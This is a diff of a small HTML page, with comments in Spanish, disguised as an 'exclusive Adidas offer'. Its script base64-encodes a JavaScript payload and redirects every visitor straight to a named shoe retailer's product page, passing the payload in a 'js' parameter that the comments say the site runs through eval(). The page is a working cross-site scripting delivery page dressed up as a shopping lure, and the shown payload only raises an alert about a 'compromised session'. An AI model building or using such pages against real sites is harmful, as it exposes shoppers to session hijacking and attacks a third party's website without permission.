@@ -1,13 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head><title>Oferta Adidas</title></head>
+<head><title>Oferta Exclusiva Adidas</title></head>
 <body>
     <script>
-        // Intentamos inyectar el código a través de un parámetro que la web lea
-        const payload = "alert('VULNERABILIDAD CRITICA: eval() detectado'); document.body.style.backgroundColor='red';";
-        const urlVulnerable = "https://maszapatillas.com/es/zapatillas-mujer/47194-143055-zapatillas-adidas-spezial-.html?js=" + btoa(payload);
+        // Este es el comando que queremos ejecutar en MasZapatillas
+        const payload = "alert('XSS AUTOMÁTICO: Sesión Comprometida'); document.body.style.background='red';";
         
-        window.location.href = urlVulnerable;
+        // Convertimos el comando a Base64 para que no se rompa la URL
+        const encodedPayload = btoa(payload);
+
+        // Intentamos forzar a la web a que lea nuestro JS desde la URL
+        // Usamos el parámetro 'js' que es el que busca su función eval()
+        const targetURL = "https://maszapatillas.com/es/zapatillas-mujer/47194-143055-zapatillas-adidas-spezial-.html?action=shopperPrices&js=" + encodedPayload;
+
+        // Redirección automática
+        window.location.href = targetURL;
     </script>
 </body>
 </html>
